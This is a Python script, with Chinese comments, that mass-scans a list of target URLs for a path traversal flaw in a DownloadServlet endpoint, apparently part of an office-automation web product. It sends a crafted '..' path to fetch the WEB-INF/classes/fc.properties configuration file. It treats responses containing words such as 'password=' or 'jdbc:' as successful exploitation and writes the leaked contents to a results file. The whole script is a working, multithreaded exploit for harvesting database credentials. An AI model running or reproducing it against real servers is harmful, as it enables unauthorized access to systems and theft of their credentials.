import requests
import threading
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# 敏感关键词列表，用于检测配置文件中的敏感信息
SENSITIVE_KEYWORDS = [
    "driver=", "jdbc:", "password=", "user=", "username=", 
    "database=", "sqlserver", "mysql", "oracle", "port=",
    "ip=", "host=", "url=", "key=", "secret="
]

def check_url_traversal(url, timeout=5):
    """
    检查单个URL是否存在路径遍历漏洞
    """
    # 构造漏洞检测的路径
    vuln_path = "/defaultroot/DownloadServlet?nodeType=8&key=x&path=..&\
FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
    
    target_url = urljoin(url, vuln_path)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }
    
    try:
        # 发送请求
        response = requests.get(
            target_url, 
            headers=headers, 
            timeout=timeout,
            verify=False,  # 忽略SSL证书验证
            allow_redirects=False  # 不跟随重定向
        )
        
        # 检查响应状态码和内容
        if response.status_code == 200:
            content = response.text.lower()
            
            # 检查响应中是否包含敏感信息
            keyword_count = sum(1 for keyword in SENSITIVE_KEYWORDS if keyword in content)
            
            # 如果找到至少2个敏感关键词，认为是成功利用
            if keyword_count >= 2:
                return True, target_url, content
        
        return False, target_url, None
        
    except requests.exceptions.RequestException:
        return False, target_url, None

def main():
    # 读取URL列表
    try:
        with open("url.txt", "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] 未找到url.txt文件")
        return
    
    if not urls:
        print("[-] url.txt文件中没有URL")
        return
    
    print(f"[+] 共读取到 {len(urls)} 个URL")
    
    vulnerable_urls = []
    
    # 使用线程池提高检测速度
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_url = {executor.submit(check_url_traversal, url): url for url in urls}
        
        for i, future in enumerate(as_completed(future_to_url)):
            url = future_to_url[future]
            try:
                is_vulnerable, target_url, content = future.result()
                
                if is_vulnerable:
                    print(f"[{i+1}/{len(urls)}] 发现漏洞: {target_url}")
                    vulnerable_urls.append((target_url, content))
                else:
                    print(f"[{i+1}/{len(urls)}] 未发现漏洞: {url}")
                    
            except Exception as e:
                print(f"[{i+1}/{len(urls)}] 检测失败: {url}, 错误: {str(e)}")
    
    # 将结果写入文件
    if vulnerable_urls:
        with open("result.txt", "w") as f:
            for target_url, content in vulnerable_urls:
                f.write(f"存在漏洞的URL: {target_url}\n")
                f.write("响应内容:\n")
                f.write(content)
                f.write("\n" + "="*50 + "\n")
        
        print(f"[+] 发现 {len(vulnerable_urls)} 个存在漏洞的URL，已写入result.txt")
    else:
        print("[-] 未发现任何存在漏洞的URL")

if __name__ == "__main__":
    # 禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"[+] 检测完成，耗时: {end_time - start_time:.2f}秒")